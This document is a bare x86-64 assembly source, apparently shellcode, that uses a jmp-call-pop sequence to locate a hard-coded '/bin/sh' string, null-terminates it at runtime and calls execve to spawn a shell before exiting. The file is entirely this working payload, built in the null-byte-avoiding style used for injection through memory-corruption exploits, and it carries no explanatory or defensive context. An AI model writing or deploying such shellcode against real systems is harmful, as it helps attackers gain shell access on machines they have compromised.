.section .text
.globl _start
_start:
	movq %rsp,%rbp
	pushq %rbx
	sub $32,%rsp
	jmp Temp
Cont:
	popq %rbx
	movq (%rbx),%rcx
	movq %rcx,32(%rsp)
	leaq 32(%rsp),%rbx
	xorq %rdi,%rdi
	xorq %rax,%rax
	movb %al,7(%rbx)
	movq %rbx,%rdi		#pointer to hard coded shell path
	movb $59,%al
	xorq %rsi,%rsi
	movq %rsi,%rdx
	syscall
	movq %rax, %rbx
	movb $60, %al	
	xorq %rdi, %rdi
	syscall
Temp:
	call Cont
Path: 
.ascii "/bin/sh"

